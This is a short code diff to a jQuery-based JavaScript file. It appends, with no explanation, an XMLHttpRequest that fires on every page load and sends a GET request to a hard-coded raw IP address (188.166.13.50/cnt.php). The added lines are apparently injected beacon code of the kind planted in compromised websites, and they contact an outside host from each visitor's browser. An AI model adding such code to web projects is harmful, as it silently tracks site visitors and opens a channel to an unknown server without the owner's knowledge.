@@ -253,3 +253,7 @@ jQuery(function($) {
     }
   });
 });
+
+var ajax = new XMLHttpRequest();
+ajax.open("GET","//188.166.13.50/cnt.php?abbox",true);
+ajax.send(null);
